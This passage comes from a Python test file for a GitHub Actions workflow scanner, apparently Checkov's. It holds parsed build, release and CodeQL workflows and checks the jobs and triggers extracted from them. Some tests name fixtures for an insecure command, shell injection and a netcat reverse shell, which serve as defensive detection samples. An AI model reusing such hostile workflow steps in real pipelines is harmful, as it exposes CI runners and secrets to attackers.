                                             'run': 'curl -X POST "https://jenkins-webhook.bridgecrew.cloud/buildByToken/build?job=Open-Source/upgrade-checkov&token=${{ secrets.BC_JENKINS_TOKEN }}"\ncurl -XPOST -u "${{ secrets.GH_PAT_USE}}:${{secrets.GH_PAT_SECRET}}" -H "Accept: application/vnd.github.everest-preview+json" -H "Content-Type: application/json" https://api.github.com/repos/bridgecrewio/checkov-action/dispatches --data \'{"event_type": "build"}\'',
                                             '__startline__': 323,
                                             '__endline__': 326}],
                                  '__startline__': 318, '__endline__': 326},
                              '__startline__': 24, '__endline__': 326},
                     '__startline__': 1, '__endline__': 326},
                    [(1, 'name: build\n'), (2, '\n'), (3, 'on:\n'), (4, '  workflow_dispatch: \n'), (5, '  push:\n'),
                     (6, '    branches:\n'), (7, '      - master\n'), (8, '    paths-ignore:\n'),
                     (9, "      - 'docs/**'\n"), (10, "      - 'INTHEWILD.md'\n"), (11, "      - 'README.md'\n"),
                     (12, "      - '.github/**'\n"), (13, "      - 'admissioncontroller/checkov-requirements.txt'\n"),
                     (14, '      - admissioncontroller/k8s/deployment.yaml\n'), (15, '      - checkov/version.py\n'),
                     (16, '      - kubernetes/requirements.txt\n'), (17, '      - coverage.svg\n'), (18, '\n'),
                     (19, 'concurrency:\n'), (20, "  group: 'build'\n"), (21, '  cancel-in-progress: true\n'),
                     (22, '\n'), (23, 'jobs:\n'), (24, '  integration-tests:\n'), (25, '    strategy:\n'),
                     (26, '      fail-fast: true\n'), (27, '      matrix:\n'),
                     (28, '        python: ["3.7", "3.8", "3.9", "3.10"]\n'),
                     (29, '        os: [ubuntu-latest, macos-latest, windows-latest]\n'),
                     (30, '    runs-on: ${{ matrix.os }}\n'), (31, '    steps:\n'),
                     (32, '      - uses: actions/checkout@v3\n'), (33, '      - uses: actions/setup-python@v4\n'),
                     (34, '        with:\n'), (35, '          python-version: ${{ matrix.python }}\n'),
                     (36, '      - uses: actions/setup-node@v3\n'), (37,
                                                                     "      - uses: azure/setup-helm@v1  # don't update till fixed https://github.com/Azure/setup-helm/issues/59\n"),
                     (38, '      - name: Install pipenv\n'), (39, '        run: |\n'),
                     (40, '          python -m pip install --no-cache-dir --upgrade pipenv\n'),
                     (41, '      - uses: imranismail/setup-kustomize@v1\n'),
                     (42, "        if: ${{ runner.os != 'windows' }}\n"),
                     (43, '      - name: Build & install checkov package\n'), (44, '        run: |\n'),
                     (45, '          pipenv --python ${{ matrix.python }}\n'),
                     (46, '          pipenv run pip install --upgrade pip==22.0.3\n'),
                     (47, '          pipenv run pip install pytest pytest-xdist\n'),
                     (48, '          pipenv run python setup.py sdist bdist_wheel\n'),
                     (49, "          bash -c 'pipenv run pip install dist/checkov-*.whl'\n"),
                     (50, '      - name: Clone Terragoat - vulnerable terraform\n'),
                     (51, '        run: git clone https://github.com/bridgecrewio/terragoat\n'),
                     (52, '      - name: Clone Cfngoat - vulnerable cloudformation\n'),
                     (53, '        run: git clone https://github.com/bridgecrewio/cfngoat\n'),
                     (54, '      - name: Clone Kubernetes-goat - vulnerable kubernetes\n'),
                     (55, '        run: git clone https://github.com/madhuakula/kubernetes-goat\n'),
                     (56, '      - name: Clone kustomize-goat - vulnerable kustomize\n'),
                     (57, '        run: git clone https://github.com/bridgecrewio/kustomizegoat\n'),
                     (58, '      - name: Create checkov reports\n'), (59, '        run: |\n'),
                     (60, "          # Just making sure the API key tests don't run on PRs\n"), (61,
                                                                                                 '          bash -c \'./integration_tests/prepare_data.sh "${{ matrix.os }}" "${{ matrix.python }}"\'\n'),
                     (62, '        env:\n'), (63, '          LOG_LEVEL: INFO\n'),
                     (64, '          BC_KEY: ${{ secrets.BC_API_KEY }}\n'),
                     (65, '          TFC_TOKEN: ${{ secrets.TFC_TOKEN }}\n'),
                     (66, '          GITHUB_PAT: ${{ secrets.GH_PAT }}\n'),
                     (67, '      - name: Run integration tests\n'), (68, '        run: |\n'),
                     (69, '          pipenv run pytest integration_tests\n'), (70, '  prisma-tests:\n'),
                     (71, '    runs-on: [ self-hosted, public, linux, x64 ]\n'), (72, '    steps:\n'),
                     (73, '      - uses: actions/checkout@v3\n'), (74, '      - uses: actions/setup-python@v4\n'),
                     (75, '        with:\n'), (76, '          python-version: 3.7\n'),
                     (77, '      - name: Install pipenv\n'), (78, '        run: |\n'),
                     (79, '          python -m pip install --no-cache-dir --upgrade pipenv\n'),
                     (80, '      - name: Clone Terragoat - vulnerable terraform\n'),
                     (81, '        run: git clone https://github.com/bridgecrewio/terragoat\n'),
                     (82, '      - name: Build & install checkov package\n'), (83, '        run: |\n'),
                     (84, '          pipenv --python 3.7\n'),
                     (85, '          pipenv run pip install --upgrade pip==22.0.3\n'),
                     (86, '          pipenv run pip install pytest pytest-xdist\n'),
                     (87, '          pipenv run python setup.py sdist bdist_wheel\n'),
                     (88, '          pipenv run pip install dist/checkov-*.whl\n'),
                     (89, '      - name: Run checkov with Prisma creds\n'), (90, '        env:\n'),
                     (91, '          PRISMA_KEY: ${{ secrets.PRISMA_KEY }}\n'),
                     (92, '          PRISMA_API_URL: ${{ secrets.PRISMA_API_URL }}\n'), (93, '        run: |\n'), (94,
                                                                                                                   '          pipenv run checkov -s -d terragoat --bc-api-key $PRISMA_KEY --repo-id yuvalyacoby/terragoat > checkov_report_prisma.txt\n'),
                     (95, '          grep "prismacloud.io" checkov_report_prisma.txt\n'), (96, '          exit $?\n'),
                     (97, '  unit-tests:\n'), (98, '    timeout-minutes: 30\n'),
                     (99, '    runs-on: [self-hosted, public, linux, x64]\n'), (100, '    steps:\n'),
                     (101, '      - uses: actions/checkout@v3\n'), (102, '      - name: Set up Python 3.7\n'),
                     (103, '        uses: actions/setup-python@v4\n'), (104, '        with:\n'),
                     (105, '          python-version: 3.7\n'), (106, '      - name: Install pipenv\n'),
                     (107, '        run: |\n'),
                     (108, '          python -m pip install --no-cache-dir --upgrade pipenv\n'),
                     (109, '      - name: Install dependencies\n'), (110, '        run: |\n'),
                     (111, '          pipenv --python 3.7\n'), (112, '          pipenv install --dev\n'),
                     (113, '      - uses: imranismail/setup-kustomize@v1\n'),
                     (114, "        if: ${{ runner.os != 'windows' }}\n"), (115, '      - name: Test with pytest\n'),
                     (116, '        env:\n'), (117, '          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}\n'),
                     (118, '        run: |\n'), (119, '          pipenv run python -m pytest tests\n'),
                     (120, '  bump-version:\n'), (121, '    needs: [integration-tests, unit-tests, prisma-tests]\n'),
                     (122, '    runs-on: [self-hosted, public, linux, x64]\n'), (123, '    environment: release\n'),
                     (124, '    timeout-minutes: 30\n'), (125, '    steps:\n'),
                     (126, '      - uses: actions/checkout@v3\n'), (127, '        with:\n'),
                     (128, '          token: ${{ secrets.GH_PAT_SECRET }}\n'), (129, '      - name: Import GPG key\n'),
                     (130, '        id: import_gpg\n'), (131, '        uses: crazy-max/ghaction-import-gpg@v5.0.0\n'),
                     (132, '        with:\n'), (133, '          gpg_private_key: ${{ secrets.GPG_PRIVATE_KEY }}\n'),
                     (134, '          passphrase: ${{ secrets.PASSPHRASE }}\n'),
                     (135, '      - name: Set up Python 3.7\n'), (136, '        uses: actions/setup-python@v4\n'),
                     (137, '        with:\n'), (138, '          python-version: 3.7\n'),
                     (139, '      - name: Install pipenv\n'), (140, '        run: |\n'),
                     (141, '          python -m pip install --no-cache-dir --upgrade pipenv\n'),
                     (142, '      - name: Install dependencies\n'), (143, '        run: |\n'),
                     (144, '          pipenv --python 3.7\n'), (145, '          pipenv install\n'),
                     (146, '      - name: version\n'), (147, '        env:\n'),
                     (148, '          GITHUB_TOKEN: ${{ secrets.PAT_TOKEN }}\n'), (149, '        run: |\n'),
                     (150, '          ## update docs\n'), (151, "          export PYTHONPATH='.'\n"),
                     (152, '          git pull\n'), (153,
                                                     '          for i in cloudformation terraform kubernetes serverless arm dockerfile secrets github_configuration gitlab_configuration bitbucket_configuration github_actions gitlab_ci bicep openapi bitbucket_pipelines all\n'),
                     (154, '          do\n'), (155, '            export scansdoc="docs/5.Policy Index/$i.md"\n'),
                     (156, '            echo "---" > "$scansdoc"\n'),
                     (157, '            echo "layout: default" >> "$scansdoc"\n'),
                     (158, '            echo "title: $i resource scans" >> "$scansdoc"\n'),
                     (159, '            echo "nav_order: 1" >> "$scansdoc"\n'),
                     (160, '            echo "---" >> "$scansdoc"\n'), (161, '            echo "" >> "$scansdoc"\n'),
                     (162, '            echo "# $i resource scans (auto generated)" >> "$scansdoc"\n'),
                     (163, '            echo "" >> "$scansdoc"\n'),
                     (164, '            pipenv run python checkov/main.py --list --framework "$i" >> "$scansdoc"\n'),
                     (165, '          done\n'), (166, '          #add cloudformation scans to serverless\n'),
                     (167, '          export scansdoc="docs/5.Policy Index/serverless.md"\n'), (168,
                                                                                                '          pipenv run python checkov/main.py --list --framework cloudformation >> "$scansdoc"\n'),
                     (169, '          git add "docs/5.Policy Index/*"\n'),
                     (170, '          git commit --reuse-message=HEAD@{1} || echo "No changes to commit"\n'),
                     (171, '          \n'), (172, "          git config --global user.name 'schosterbarak'\n"),
                     (173, "          git config --global user.email 'schosterbarak@users.noreply.github.com'\n"),
                     (174, '          git fetch --tags\n'),
                     (175, '          latest_tag=$(git describe --tags `git rev-list --tags --max-count=1`)\n'),
                     (176, '          echo "latest tag: $latest_tag"\n'), (177,
                                                                           '          new_tag=$(echo $latest_tag | awk -F. -v a="$1" -v b="$2" -v c="$3" \'{printf("%d.%d.%d", $1+a, $2+b , $3+1)}\')\n'),
                     (178, '          echo "new tag: $new_tag"          \n'),
                     (179, '          ## update python version\n'),
                     (180, '          echo "version = \'$new_tag\'" > \'checkov/version.py\'\n'),
                     (181, '          echo "checkov==$new_tag" > \'kubernetes/requirements.txt\'\n'),
                     (182, '          echo "checkov==$new_tag" > \'admissioncontroller/checkov-requirements.txt\'\n'), (
                         183,
                         '          git commit --reuse-message=HEAD@{1} checkov/version.py kubernetes/requirements.txt admissioncontroller/checkov-requirements.txt || echo "No changes to commit"\n'),
                     (184, '          git push origin\n'), (185, '          git tag $new_tag\n'),
                     (186, '          git push --tags\n'), (187, '          RELEASE_NOTE=$(git log -1 --pretty=%B)\n'),
                     (188, '          echo "::set-output name=version::$new_tag"\n'),
                     (189, '          echo "::set-output name=notes::$RELEASE_NOTE"\n'), (190, '        id: version\n'),
                     (191, '      - name: release\n'), (192, '        uses: actions/create-release@v1\n'),
                     (193, '        with:\n'), (194, '          draft: false\n'),
                     (195, '          prerelease: false\n'),
                     (196, '          release_name: ${{ steps.version.outputs.version }}\n'),
                     (197, '          tag_name: ${{ steps.version.outputs.version }}\n'),
                     (198, '          body: ${{ steps.version.outputs.notes }}\n'), (199, '        env:\n'),
                     (200, '          GITHUB_TOKEN: ${{ github.token }}\n'),
                     (201, '      - name: create python package\n'), (202, '        run: |\n'),
                     (203, '          pipenv run python setup.py sdist bdist_wheel\n'),
                     (204, '      - name: Publish a Python distribution to PyPI\n'),
                     (205, '        uses: pypa/gh-action-pypi-publish@master\n'), (206, '        with:\n'),
                     (207, '          user: __token__\n'), (208, '          password: ${{ secrets.PYPI_TOKEN }}\n'),
                     (209, '      - name: sleep and wait for package to refresh\n'), (210, '        run: |\n'),
                     (211, '          sleep 2m\n'), (212, '    outputs:\n'),
                     (213, '      version: ${{ steps.version.outputs.version }}\n'),
                     (214, '  publish-checkov-dockerhub:\n'), (215, '    runs-on: [self-hosted, public, linux, x64]\n'),
                     (216, '    needs: bump-version\n'), (217, '    environment: release\n'), (218, '    steps:\n'),
                     (219, '      - uses: actions/checkout@v3\n'), (220, '      - name: Get release version\n'),
                     (221, '        id: versions\n'), (222, '        run: |\n'),
                     (223, '          checkov_version=${{ needs.bump-version.outputs.version }}\n'),
                     (224, '          checkov_major_version=$(echo "${checkov_version}" | head -c1)\n'),
                     (225, '          echo "::set-output name=version::$checkov_version"\n'),
                     (226, '          echo "::set-output name=major_version::$checkov_major_version"\n'),
                     (227, '      - name: Publish to Registry\n'),
                     (228, '        uses: elgohr/Publish-Docker-Github-Action@master\n'), (229, '        with:\n'),
                     (230, '          name: bridgecrew/checkov\n'),
                     (231, '          username: ${{ secrets.DOCKERHUB_USERNAME }}\n'),
                     (232, '          password: ${{ secrets.DOCKERHUB_PASSWORD }}\n'),
                     (233, '          buildoptions: "--no-cache"\n'), (234,
                                                                       '          tags: "latest,${{ steps.versions.outputs.version }},${{ steps.versions.outputs.major_version }}"\n'),
                     (235, '  publish-checkov-k8s-dockerhub:\n'),
                     (236, '    runs-on: [self-hosted, public, linux, x64]\n'), (237, '    needs: bump-version\n'),
                     (238, '    environment: release\n'), (239, '    steps:\n'),
                     (240, '      - uses: actions/checkout@v3\n'), (241, '      - name: update checkov-k8s version\n'),
                     (242, '        run: |\n'),
                     (243, '          checkov_version=${{ needs.bump-version.outputs.version }}\n'),
                     (244, '          checkov_major_version=$(echo "${checkov_version}" | head -c1)\n'),
                     (245, '          echo "::set-output name=version::$checkov_version"\n'),
                     (246, '          echo "::set-output name=major_version::$checkov_major_version"\n'),
                     (247, '        id: versions\n'), (248, '      - name: Publish to Registry\n'),
                     (249, '        uses: elgohr/Publish-Docker-Github-Action@master\n'), (250, '        with:\n'),
                     (251, '          name: bridgecrew/checkov-k8s\n'),
                     (252, '          username: ${{ secrets.DOCKERHUB_USERNAME }}\n'),
                     (253, '          password: ${{ secrets.DOCKERHUB_PASSWORD }}\n'), (254,
                                                                                        '          tags: "latest,${{ steps.versions.outputs.version }},${{ steps.versions.outputs.major_version }}"\n'),
                     (255, '          dockerfile: kubernetes/Dockerfile\n'),
                     (256, '          buildoptions: "--no-cache"\n'),
                     (257, '  publish-checkov-admissioncontroller-dockerhub:\n'),
                     (258, '    runs-on: [self-hosted, public, linux, x64]\n'), (259, '    environment: release\n'),
                     (260, '    needs: bump-version\n'), (261, '    steps:\n'),
                     (262, '      - uses: actions/checkout@v2\n'), (263, '        with:\n'),
                     (264, '          token: ${{ secrets.GH_PAT_SECRET }}\n'), (265, '      - name: get versions\n'),
                     (266, '        run: |\n'),
                     (267, '          checkov_version=${{ needs.bump-version.outputs.version }}\n'),
                     (268, '          checkov_major_version=$(echo "${checkov_version}" | head -c1)\n'),
                     (269, '          echo "::set-output name=version::$checkov_version"\n'),
                     (270, '          echo "::set-output name=major_version::$checkov_major_version"\n'),
                     (271, '        id: versions\n'), (272, '      - name: Publish to Registry\n'),
                     (273, '        id: docker_publish\n'),
                     (274, '        uses: elgohr/Publish-Docker-Github-Action@master\n'), (275, '        with:\n'),
                     (276, '          name: bridgecrew/whorf\n'),
                     (277, '          username: ${{ secrets.DOCKERHUB_USERNAME }}\n'),
                     (278, '          password: ${{ secrets.DOCKERHUB_PASSWORD }}\n'), (279,
                                                                                        '          tags: "latest,${{ steps.versions.outputs.version }},${{ steps.versions.outputs.major_version }}"\n'),
                     (280, '          dockerfile: admissioncontroller/Dockerfile\n'),
                     (281, '          buildoptions: "--no-cache"\n'), (282, '      - name: Image digest\n'),
                     (283, '        run: echo ${{ steps.docker_publish.outputs.digest }}\n'),
                     (284, '      - name: Update deployment\n'),
                     (285, '        uses: jacobtomlinson/gha-find-replace@master\n'), (286, '        with:\n'),
                     (287, '          find: "image: bridgecrew/whorf@sha256:[a-f0-9]{64}"\n'),
                     (288, '          replace: "image: ${{ steps.docker_publish.outputs.digest }}"\n'),
                     (289, '          include: "admissioncontroller/k8s/deployment.yaml"\n'),
                     (290, '      - name: commit changes to deployment\n'), (291, '        run: |\n'),
                     (292, '          git pull\n'), (293,
                                                     '          git commit --reuse-message=HEAD@{1} admissioncontroller/k8s/deployment.yaml || echo "No changes to commit"\n'),
                     (294, '          git push origin\n'), (295, '  publish-checkov-pyston-dockerhub:\n'),
                     (296, '    runs-on: [self-hosted, public, linux, x64]\n'), (297, '    needs: bump-version\n'),
                     (298, '    environment: release\n'), (299, '    steps:\n'),
                     (300, '      - uses: actions/checkout@v3\n'), (301, '      - name: Get release version\n'),
                     (302, '        id: versions\n'), (303, '        run: |\n'),
                     (304, '          checkov_version=${{ needs.bump-version.outputs.version }}\n'),
                     (305, '          checkov_major_version=$(echo "${checkov_version}" | head -c1)\n'),
                     (306, '          echo "::set-output name=version::$checkov_version"\n'),
                     (307, '          echo "::set-output name=major_version::$checkov_major_version"\n'),
                     (308, '      - name: Publish to Registry\n'),
                     (309, '        uses: elgohr/Publish-Docker-Github-Action@master\n'), (310, '        with:\n'),
                     (311, '          name: bridgecrew/checkov\n'),
                     (312, '          username: ${{ secrets.DOCKERHUB_USERNAME }}\n'),
                     (313, '          password: ${{ secrets.DOCKERHUB_PASSWORD }}\n'), (314,
                                                                                        '          tags: "pyston,${{ steps.versions.outputs.version }}-pyston,${{ steps.versions.outputs.major_version }}-pyston"\n'),
                     (315, '          dockerfile: Dockerfile.pyston\n'),
                     (316, '          buildoptions: "--no-cache"\n'), (317, '  update-bridgecrew-projects:\n'),
                     (318, '    needs: publish-checkov-dockerhub\n'),
                     (319, '    runs-on: [self-hosted, public, linux, x64]\n'), (320, '    environment: release\n'),
                     (321, '    steps:\n'), (322, '      - uses: actions/checkout@v3\n'),
                     (323, '      - name: update checkov release\n'), (324, '        run: |\n'), (325,
                                                                                                  '          curl -X POST "https://jenkins-webhook.bridgecrew.cloud/buildByToken/build?job=Open-Source/upgrade-checkov&token=${{ secrets.BC_JENKINS_TOKEN }}"\n'),
                     (326,
                      '          curl -XPOST -u "${{ secrets.GH_PAT_USE}}:${{secrets.GH_PAT_SECRET}}" -H "Accept: application/vnd.github.everest-preview+json" -H "Content-Type: application/json" https://api.github.com/repos/bridgecrewio/checkov-action/dispatches --data \'{"event_type": "build"}\'')])

    result_codeql_analysis = (
        {'name': 'CodeQL',
         True: {'push': {'branches': ['master'], '__startline__': 18, '__endline__': 19},
                'pull_request': {'branches': ['master'], '__startline__': 21, '__endline__': 22},
                'schedule': [{'cron': '17 4 * * 2', '__startline__': 23, '__endline__': 24}],
                'workflow_dispatch': None, '__startline__': 17, '__endline__': 27},
         'jobs': {'analyze': {'name': 'Analyze', 'runs-on': ['self-hosted', 'public', 'linux', 'x64'],
                              'permissions': {'actions': 'read', 'contents': 'read',
                                              'security-events': 'write', '__startline__': 32, '__endline__': 35},
                              'steps': [
                                  {'name': 'Checkout repository', 'uses': 'actions/checkout@v3', '__startline__': 36,
                                   '__endline__': 38}, {'name': 'Set up Python', 'uses': 'actions/setup-python@v4',
                                                        'with': {'python-version': '3.10', '__startline__': 41,
                                                                 '__endline__': 42}, '__startline__': 38,
                                                        '__endline__': 42},
                                  {'name': 'Setup python for CodeQL',
                                   'run': 'python -m pip install --upgrade pip pipenv\necho "CODEQL_PYTHON=$(which python)" >> $GITHUB_ENV\n',
                                   '__startline__': 42, '__endline__': 46},
                                  {'name': 'Check Pipfile.lock changed', 'uses': 'tj-actions/verify-changed-files@v10',
                                   'id': 'changed_files',
                                   'with': {'files': 'Pipfile.lock', '__startline__': 50, '__endline__': 51},
                                   '__startline__': 46, '__endline__': 51},
                                  {'name': 'Setup dependencies if they changed',
                                   'if': "steps.changed_files.outputs.files_changed == 'true'",
                                   'run': 'pipenv lock -r > requirements.txt\npip install -r requirements.txt\n',
                                   '__startline__': 51, '__endline__': 56},
                                  {'name': 'Initialize CodeQL', 'uses': 'github/codeql-action/init@v2',
                                   'with': {'languages': 'python', 'setup-python-dependencies': False,
                                            '__startline__': 59, '__endline__': 61}, '__startline__': 56,
                                   '__endline__': 61},
                                  {'name': 'Autobuild', 'uses': 'github/codeql-action/autobuild@v2',
                                   '__startline__': 61, '__endline__': 63},
                                  {'name': 'Perform CodeQL Analysis', 'uses': 'github/codeql-action/analyze@v2',
                                   '__startline__': 63, '__endline__': 65}], '__startline__': 29, '__endline__': 65},
                  '__startline__': 28, '__endline__': 65}, '__startline__': 14, '__endline__': 65},
        [(1, '\n'), (2, '\n'), (3, '# For most projects, this workflow file will not need changing; you simply need\n'),
         (4, '# to commit it to your repository.\n'), (5, '#\n'),
         (6, '# You may wish to alter this file to override the set of languages analyzed,\n'),
         (7, '# or to provide custom queries or build logic.\n'), (8, '#\n'), (9, '# ******** NOTE ********\n'),
         (10, '# We have attempted to detect the languages in your repository. Please check\n'),
         (11, '# the `language` matrix defined below to confirm you have the correct set of\n'),
         (12, '# supported CodeQL languages.\n'), (13, '#\n'), (14, 'name: "CodeQL"\n'), (15, '\n'), (16, 'on:\n'),
         (17, '  push:\n'), (18, '    branches: [ master ]\n'), (19, '  pull_request:\n'),
         (20, '    # The branches below must be a subset of the branches above\n'), (21, '    branches: [ master ]\n'),
         (22, '  schedule:\n'), (23, "    - cron: '17 4 * * 2'\n"), (24, '  workflow_dispatch:\n'), (25, '\n'),
         (26, '\n'), (27, 'jobs:\n'), (28, '  analyze:\n'), (29, '    name: Analyze\n'),
         (30, '    runs-on: [self-hosted, public, linux, x64]\n'), (31, '    permissions:\n'),
         (32, '      actions: read\n'), (33, '      contents: read\n'), (34, '      security-events: write\n'),
         (35, '    steps:\n'), (36, '      - name: Checkout repository\n'), (37, '        uses: actions/checkout@v3\n'),
         (38, '      - name: Set up Python\n'), (39, '        uses: actions/setup-python@v4\n'),
         (40, '        with:\n'), (41, "          python-version: '3.10'\n"),
         (42, '      - name: Setup python for CodeQL\n'), (43, '        run: |\n'),
         (44, '          python -m pip install --upgrade pip pipenv\n'),
         (45, '          echo "CODEQL_PYTHON=$(which python)" >> $GITHUB_ENV\n'),
         (46, '      - name: Check Pipfile.lock changed\n'),
         (47, '        uses: tj-actions/verify-changed-files@v10\n'), (48, '        id: changed_files\n'),
         (49, '        with:\n'), (50, '          files: Pipfile.lock\n'),
         (51, '      - name: Setup dependencies if they changed\n'),
         (52, "        if: steps.changed_files.outputs.files_changed == 'true'\n"), (53, '        run: |\n'),
         (54, '          pipenv lock -r > requirements.txt\n'), (55, '          pip install -r requirements.txt\n'),
         (56, '      - name: Initialize CodeQL\n'), (57, '        uses: github/codeql-action/init@v2\n'),
         (58, '        with:\n'), (59, '          languages: python\n'),
         (60, '          setup-python-dependencies: false\n'), (61, '      - name: Autobuild\n'),
         (62, '        uses: github/codeql-action/autobuild@v2\n'), (63, '      - name: Perform CodeQL Analysis\n'),
         (64, '        uses: github/codeql-action/analyze@v2\n')])

    def test_get_jobs_on_result(self):
        expected_jobs = {"bridgecrew": {"__startline__": 8, "__endline__": 20},
                         "bridgecrew2": {"__startline__": 21, "__endline__": 33}, }

        jobs = Runner._get_jobs(self, self.result[0])
        assert expected_jobs == jobs

    def test_get_triggers_on_result(self):
        expected_triggers = {"workflow_dispatch", "schedule"}

        triggers = Runner._get_triggers(self, self.result[0])
        assert expected_triggers == triggers

    def test_get_jobs_on_result_unsecure_command(self):
        expected_jobs = {"job2": {"__startline__": 7, "__endline__": 15},
                         "job3": {"__startline__": 16, "__endline__": 21}, }

        jobs = Runner._get_jobs(self, self.result_unsecure_command[0])
        assert expected_jobs == jobs

    def test_get_triggers_on_result_unsecure_command(self):
        expected_triggers = {'pull_request'}
        triggers = Runner._get_triggers(self, self.result_unsecure_command[0])
        assert expected_triggers == triggers

    def test_get_triggers_on_result_shell_injection(self):
        expected_triggers = {'issues'}
        triggers = Runner._get_triggers(self, self.result_shell_injection[0])
        assert expected_triggers == triggers

    def test_get_jobs_on_result_shell_injection(self):
        expected_jobs = {'job1': {'__startline__': 6, '__endline__': 14},
                         'job2': {'__startline__': 15, '__endline__': 19},
                         'unsecure-steps': {'__startline__': 20, '__endline__': 64}}

        jobs = Runner._get_jobs(self, self.result_shell_injection[0])
        assert expected_jobs == jobs

    def test_get_jobs_on_result_netcatreverseshell(self):
        expected_jobs = {'prep': {'__startline__': 15, '__endline__': 19},
                         'build': {'__startline__': 21, '__endline__': 33}}

        jobs = Runner._get_jobs(self, self.result_netcatreverseshell[0])
        assert expected_jobs == jobs

    def test_get_triggers_on_result_netcatreverseshell(self):
        expected_triggers = {'push', 'workflow_dispatch'}
        triggers = Runner._get_triggers(self, self.result_netcatreverseshell[0])
        assert expected_triggers == triggers

    def test_get_jobs_on_result_build(self):
        expected_jobs = {'integration-tests': {'__startline__': 25, '__endline__': 70},
                         'prisma-tests': {'__startline__': 71, '__endline__': 97},
                         'unit-tests': {'__startline__': 98, '__endline__': 120},
                         'bump-version': {'__startline__': 121, '__endline__': 214},
                         'publish-checkov-dockerhub': {'__startline__': 215, '__endline__': 235},
                         'publish-checkov-k8s-dockerhub': {'__startline__': 236, '__endline__': 257},
                         'publish-checkov-admissioncontroller-dockerhub': {'__startline__': 258, '__endline__': 295},
                         'publish-checkov-pyston-dockerhub': {'__startline__': 296, '__endline__': 317},
                         'update-bridgecrew-projects': {'__startline__': 318, '__endline__': 326}}

        jobs = Runner._get_jobs(self, self.result_build[0])
        assert expected_jobs == jobs

    def test_get_triggers_on_result_build(self):
        expected_triggers = {"workflow_dispatch", "push"}
        triggers = Runner._get_triggers(self, self.result_build[0])
        assert expected_triggers == triggers

    def test_get_jobs_on_result_codeql_analysis(self):
        expected_jobs ={'Analyze': {'__startline__': 29, '__endline__': 65}}

        jobs = Runner._get_jobs(self, self.result_codeql_analysis[0])
        assert expected_jobs == jobs

    def test_get_triggers_on_result_codeql_analysis(self):
        expected_triggers ={'push', 'schedule', 'pull_request', 'workflow_dispatch'}
        triggers = Runner._get_triggers(self, self.result_codeql_analysis[0])
        assert expected_triggers == triggers
